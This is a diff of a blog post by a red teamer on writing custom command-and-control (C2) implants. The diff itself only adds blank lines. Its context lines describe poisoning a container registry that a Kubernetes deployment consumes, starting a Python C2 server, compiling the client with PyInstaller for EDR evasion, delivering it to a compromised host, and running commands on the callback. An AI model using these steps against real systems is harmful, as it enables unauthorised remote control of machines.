@@ -7,6 +7,7 @@ Open source or commodity (purchasable C2 frameworks) are rapidly added to signat
 My first C2 (written prior to the widespread usage of AI) was for a Kubernetes deployment where I had write access to a container registry, allowing me to modify a [container](https://github.com/sneakerhax/C2PE/blob/main/Command_and_Control/docker_image_sh/README.md) and push (upload) it back into the registry. After being pushed into the registry, it was consumed by the Kubernetes deployment, which executed the payload. Although simple, it served its purpose well and evaded detections. Other C2s I created afterwards included PowerShell, C#, and VSCode VSIX (plugin) files written in NodeJS (a language I didn't know, so it took around 1 week to develop).
 
 Example of the Dockerfile used to target Kubernetes with my C2:
+
 ```
 FROM debian
 
@@ -97,26 +98,31 @@ One of the interesting aspects of C2 is that at first glance it seems complicate
 With this in mind, the requirements become more straightforward. To demonstrate, I took a coding example from the Python docs and turned it into a [Python streams C2](https://github.com/sneakerhax/C2PE/blob/main/Command_and_Control/python_stream_c2/README.md). It shows how any piece of code can be turned into a C2 as long as it contains the core components.
 
 In this example you can start the server:
+
 ```
 python3 server.py
 ** C2 Serving on ('0.0.0.0', 8888) **
 ```
 
 The server is now ready to accept connections. Next you can run the client:
+
 ```
 python3 client.py
 ```
 
 Although I would recommend compiled binaries (keep in mind PyInstaller files are not a good option for EDR evasion as they're heavily scrutinized).
+
 ```
 pyinstaller.exe --onefile --noconsole .\client.py
 ```
 
 Deliver the payload to the compromised host:
+
 ```
 C:\>client.exe
 ```
 Check the server for the callback (connection) and run a command:
+
 ```
 [*] Received callback from '192.168.1.6'
 [+] Command to run?
@@ -156,6 +162,7 @@ done
 ```
 
 Note the change after updating the sleep.txt file to 30:
+
 ```
 bash update_sleep.sh
 interval is 60
